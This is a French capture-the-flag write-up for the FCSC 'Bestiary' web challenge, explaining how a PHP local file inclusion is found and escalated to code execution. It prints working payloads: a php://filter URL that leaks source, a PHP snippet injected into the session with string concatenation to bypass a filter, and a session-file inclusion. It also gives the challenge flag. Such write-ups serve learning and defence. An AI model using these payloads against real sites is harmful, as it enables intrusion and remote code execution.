# Bestiary - Web - 200

> On vous demande simplement de trouver le flag.

On continue dans la lancée des challenges Web, celui-ci suit le thème du challenge "Enter the Dungeon", et a également été bien réussi avec un total de 373 validations à la fin.

Commençons sans plus attendre !

## Analyse du fonctionnement de l'application

Sur l'application, il nous est proposé à travers un menu déroulant de sélectionner une créature pour afficher son image ainsi qu'une description qui lui est associée.

Après sélection, nous remarquons que le nom de cette créature est présente dans l'url dans le paramètre "monster":

```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=displacer_beast```

## Recherche d'une vulnérabilité

On essaie de titiller légèrement le paramètre "monster" en lui fournissant par une simple apostrophe pour voir ce qu'il en ressort.

```
Warning: include('): failed to open stream: No such file or directory in /var/www/html/index.php on line 33

Warning: include(): Failed opening ''' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 33
```

Tiens, tiens ça ressemble tout bonnement à une petite LFI (Local File Inclusion), en plus le paramètre entier semble le paramètre direct de l'include, il n'y a pas de chaîne supplémentaire.

## Exploitation de la LFI

Essayons de leak le code de la page avec la technique des wrappers PHP:

```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.base64-encode/resource=index.php```

Bingo, on a bien le code en base64 qui nous est renvoyé, on le décode puis pouvons analyser le code de cette page:

```php
<?php
	session_save_path("./sessions/");
	session_start();
	include_once('flag.php');
?>
<html>
<head>
	<title>Bestiary</title>
</head>
<body style="background-color:#3CB371;">
<center><h1>Bestiary</h1></center>
<script>
function show()
{
	var monster = document.getElementById("monster").value;
	document.location.href = "index.php?monster="+monster;
}
</script>

<p>
<?php
	$monster = NULL;

	if(isset($_SESSION['monster']) && !empty($_SESSION['monster']))
		$monster = $_SESSION['monster'];
	if(isset($_GET['monster']) && !empty($_GET['monster']))
	{
		$monster = $_GET['monster'];
		$_SESSION['monster'] = $monster;
	}

	if($monster !== NULL && strpos($monster, "flag") === False)
		include($monster);
	else
		echo "Select a monster to read his description.";
?>
</p>

<select id="monster">
	<option value="beholder">Beholder</option>
	<option value="displacer_beast">Displacer Beast</option>
	<option value="mimic">Mimic</option>
	<option value="rust_monster">Rust Monster</option>
	<option value="gelatinous_cube">Gelatinous Cube</option>
	<option value="owlbear">Owlbear</option>
	<option value="lich">Lich</option>
	<option value="the_drow">The Drow</option>
	<option value="mind_flayer">Mind Flayer</option>
	<option value="tarrasque">Tarrasque</option>
</select> <input type="button" value="show description" onclick="show()">
<div style="font-size:70%">Source : https://io9.gizmodo.com/the-10-most-memorable-dungeons-dragons-monsters-1326074030</div><br />
</body>
</html>
```

Comme nous l'avions deviné, le paramètre "monster" est directement en paramètre du include.
Mais pour obtenir le flag, nous devons faire face à d'autres problèmes ...

L'idéal serait de directement inclure le fichier flag.php avec la LFI, mais la chaîne "flag" est filtrée avec **strpos** ainsi qu'une comparaison stricte, ce qui nous empêche de la contourner.

Cependant, nous remarquons quelque chose d'étrange, le dossier de sauvegarde des sessions a été placé dans le dossier "sessions/".
Nous contrôlons également le contenu de notre session.

## LFI to RCE

L'idée serait ici de placer dans notre session du code PHP permettant d'inclure le flag, tout en passant la condition du **strpos**, puis d'inclure notre fichier de session dans la page, permettant d'exécuter notre code PHP !

Dans un premier temps, nous devons remplacer le champ "monster" de notre session PHP par notre payload:

```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=<?php echo file_get_contents("fla"."g.php"); ?>```

La concaténation va permettre de contourner la protection.

Nous récupérons ensuite notre session PHP qui est présente dans le cookie PHPSESSID: ```c6f7d94e27cad2edf40ee6a67f4e1ecb```

Puis nous incluons ensuite notre fichier de session:

```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=sessions/sess_c6f7d94e27cad2edf40ee6a67f4e1ecb```

Et là, comme par magie, le code présent dans notre session a été exécuté, et nous pouvons apercevoir le flag présent dans le fichier flag.php !

```
monster|s:47:"<?php
	$flag="FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}";
";</p>
```

FLAG: FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}